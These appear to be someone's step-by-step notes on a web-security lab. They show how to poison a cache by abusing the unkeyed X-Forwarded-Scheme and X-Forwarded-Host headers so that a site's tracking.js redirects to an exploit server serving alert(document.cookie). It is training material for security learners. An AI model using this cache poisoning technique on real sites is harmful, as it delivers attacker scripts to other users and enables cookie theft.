1) we focus on the request that gets a js file for user tracking :
    GET https://0aae0098040fd6938175e3900074006c.web-security-academy.net/resources/js/tracking.js

2) we can see that if we put:
    X-Forwarded-Scheme: http then the server sends us a redirect on https

2) we can also see that when we put X-Forwarded-Host: test.com with the previosu header then the redirection is done on the X-Forwarded-Host we choose
    if the initial request was https://LAB/resources/js/tracking.js?value=0 and the X-Forwarded-Host is test.com then the server redirect us to https://test.com/resources/js/tracking.js?value=0

3)we can see that when we remove X-Forwarded-Host and X-Forwarded-Scheme the response is identical, so the response is cached and X-Forwarded-Host and X-Forwarded-Scheme are not used as keys

4) So we can force the server to get the js from a malicious website instead the legit one

5) go to exploit server and change the end point to /resources/js/tracking.js

6) put in the body alert(document.cookie)

7) force the server to store in cache the malicious response. so send a request to GET https://0aae0098040fd6938175e3900074006c.web-security-academy.net/resources/js/tracking.js adding:
    X-Forwarded-Scheme: http
    X-Forwarded-Host: exploit_server_host

8) go on browser, you can see the alert
